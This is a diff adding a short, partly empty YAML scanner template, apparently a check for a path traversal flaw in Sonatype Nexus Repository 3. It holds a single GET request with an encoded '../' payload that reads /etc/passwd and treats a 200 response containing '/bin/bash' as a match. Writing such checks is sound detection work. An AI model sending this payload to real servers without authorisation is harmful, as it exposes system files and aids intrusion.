@@ -1,0 +1,16 @@
+id:
+
+info:
+  name: Sonatype Nexus Repository 3 路径遍历漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+response1:
+  body: /bin/bash
+  code: 200
+requests2:
+response2:
